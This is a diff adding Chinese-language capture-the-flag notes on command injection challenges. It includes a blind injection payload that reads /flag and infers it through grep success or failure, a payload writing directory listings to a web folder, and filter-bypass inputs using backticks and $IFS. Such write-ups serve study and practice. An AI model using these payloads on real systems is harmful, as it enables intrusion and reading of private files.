@@ -74,3 +74,26 @@ payload
 > %26ls>/var/www/images/y.txt%26
 - urlencode `&` : %26
 - 我們可以上傳檔案到 /var/www/images/ 並且透過 url: /image?filename=y.txt 讀檔(看其他 image 讀取的方法得知)
+
+
+### SICST Dig blind2
+一個有 command injection 漏洞的網站，但 sever 不會回傳查詢值，所以只能透過回傳的 success 和 fail 來判斷以及找 flag
+
+payload
+```
+example.com'&&cat /flag|grep SCIST{
+```
+- 把 flag 印出來，並且查看 flag 是否有 substr `SCIST{`
+- 使用 `&&` 讓 grep 有成功找到時回傳 success
+- 使用 [script](dig_expolit.py) 暴搜找 grep 的 prefix
+
+### SCIST Dig Waf5
+- ``` `ls` ```
+- ``` `$PWD` ```
+- ``` `$HOME` ```
+- ``` `expr$IFS\substr$IFS$PWD$IFS\1$IFS\1` ```
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+- $IFS: bypass 空白
+
+想法越鑽越遠QQ
